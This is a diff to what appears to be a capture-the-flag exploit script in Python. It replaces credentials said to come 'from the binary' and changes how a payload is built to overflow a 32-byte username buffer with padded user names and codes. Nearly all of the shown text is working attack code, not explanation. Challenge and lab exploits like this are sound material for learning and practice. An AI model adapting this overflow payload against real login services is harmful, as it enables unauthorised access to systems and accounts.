@@ -63,10 +63,11 @@ continue
 # Debuginfo:  Yes
 
 # from the binary
-target_user = "cristina33"
-target_pass = "01843101"
-login_user = "hoover95"
-login_pass = "7123308"
+login_user = "cors33"
+login_code = "7726404ea39cb43"
+
+win_user = "netrunner2d"
+win_code = "2d9d90b636318a"
 
 
 def exploit() -> bool:
@@ -79,7 +80,7 @@ def exploit() -> bool:
     io.recvuntil(b"name: ")
     io.sendline(login_user.encode("ascii"))
     io.recvuntil(b"code: ")
-    io.sendline(login_pass.encode("ascii"))
+    io.sendline(login_code.encode("ascii"))
 
     # overflowing the username
     io.recvuntil(b"> ")
@@ -87,10 +88,10 @@ def exploit() -> bool:
     io.recvuntil(b"name: ")
 
     # forming the payload
-    payload = target_user
-    payload += "A" * (32 - len(target_user))
-    payload += target_pass
-    payload += "B" * (32 - len(target_pass) - 4)
+    payload = win_user
+    payload += "A" * (32 - len(win_user))
+    payload += win_code
+    payload += "B" * (32 - len(win_code) - 4)
 
     # sending it
     io.info(f"Overflowing the buffer with {payload}.")
